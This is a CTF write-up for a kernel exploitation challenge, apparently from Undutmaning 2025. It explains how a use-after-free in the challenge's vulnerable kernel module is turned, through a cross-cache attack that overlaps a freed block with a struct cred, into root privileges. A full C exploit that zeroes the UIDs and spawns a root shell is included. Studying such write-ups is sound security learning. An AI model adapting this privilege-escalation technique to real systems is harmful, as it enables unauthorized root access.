---
title: Cred Sattelite - Undutmaning 2025 
description: Exploiting a User-After-Free in a kernel module to corrupt cred structure across caches, and gain priveledge escalation.
date: 1744130816
tags:
  - Writeup
  - Binary Exploitation
  - Kernel
slug: Cred Sattelite - Undutmaning 2025
published: true
---



I recently played solo in the Undutmaning, which is a Swedish CTF organized by the Swedish Security Agencies. I solved all pwn challenges except for this one, a kernel pwn challenge, which had 0 solves by the end of the CTF.



## Challenge Overview
You are given a script to run the linux VM, a CPIO and a vulnerable kernel module, along with it's <a href="/cred-sattelite.c">**source**</a>. In the kernel module you ahve the following actions that you can take through IOCTLing the device:

1. Allocate a block
2. Set a block as your "current" block
3. Free a block
4. "Reset" your current block, aka zero out the value field, and a bit beyond that.
5. Reset the module, free all blocks and null out your current block.



## Vulnerability Analysis
The main vulnerability in the module is a Use-After-Free, where you can free a data block, and then keep a reference to it as the "current block". Using this reference you run reset_current_block which zeroes 24 bytes in the block.

Arbitrarily zeroing 24 bytes in a dangling reference seems like a very specific primitive, but if you manage to allocate a struct cred (hinted at by the challenge name "cred sattelite"), then this zeroing will zero out UIDs of the credential.

## Exploitation Strategy
What complicates the exploitation a bit is that cred struct have their own slab cache, called the **cred_jar** This means we need to do a cross-cache attack, we need to have the UAF be freed back into the page allocator, then allocated by the cred jar, then have the struct be allocated there. 

This is done with the following way:
1. Saturate cred jar, so that the next allocation of creds needs a call to page allocator. This can be done through a large amount of forks, which will make the kernel allocate many cred structs, without dropping them.
2. Allocate many pages of data_block
3. Save a current block 
4. Free all your blocks, now the data_block you saved is out in the page allocator
5. Allocate a cred structure. This will make the slab allocator request a new page due to the setup we did beforehand. This page will be grabbed up from page allocator, same one we have our current_block on.


- NOTE: We don't have to make another fork, it will be a lot easier to do **setuid(getuid()).** The struct cred is a Copy-On-Write structure, so it gets reallocated every time you write to it, and then just the references are swapped.

6. Now that we have overlapping current_block and struct_cred we can zero out uid fields through ``reset_current_block``
7. Now we have root! Pop shell and you're finished.

## Implementation
```c
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/fsuid.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

#define IOCTL_FREE 0x1337
#define IOCTL_ALLOC 0x1338
#define IOCTL_SET_CURRENT 0x1339
#define IOCTL_RESET_CURRENT 0x1340
#define IOCTL_RESET_MODULE 0x1341

#define MAX_BLOCKS 1000

int global_fd;

void open_chardev() {
  char *dev_path = "/dev/cred-block-module";
  global_fd = open(dev_path, O_RDWR);
  printf("[*] Opened %s into %d\n", dev_path, global_fd);
}

void cred_alloc() { ioctl(global_fd, IOCTL_ALLOC); }

void set_current(int n) { ioctl(global_fd, IOCTL_SET_CURRENT, n); }

void free_all() {
  for (int i = 0; i < 1000; i++) {
    ioctl(global_fd, IOCTL_FREE, i);
  }
}

void reset_current() { ioctl(global_fd, IOCTL_RESET_CURRENT); }


int main(int argc, char *argv[]) {
  open_chardev();
  int initial_forks = 224;

  printf("[*] Making %d forks to drain cred struct\n", initial_forks);
  for (int i = 0; i < initial_forks; i++) {
    if (fork() == 0) {
      sleep(60);
      exit(0);
    }
  }

  int CREDALLOC = 1000;
  printf("[*] Making %d data_block allocations\n", CREDALLOC);
  for (int i = 0; i < CREDALLOC; i++) {
    cred_alloc();
  }

  set_current(876);

  free_all();

  printf("[*] Reallocating cred_struct of current process.\n");
  printf("[*] [This triggers page allocator, to give back what current points to]\n");
  setuid(getuid());


  printf("[*] Now cred struct overlaps with current block\n");
  reset_current();
  printf("[*] reset_current() to zero out uid fields\n");
  printf("[*] UID: %d\n", getuid());

  system("/bin/sh");
  return 0;
}
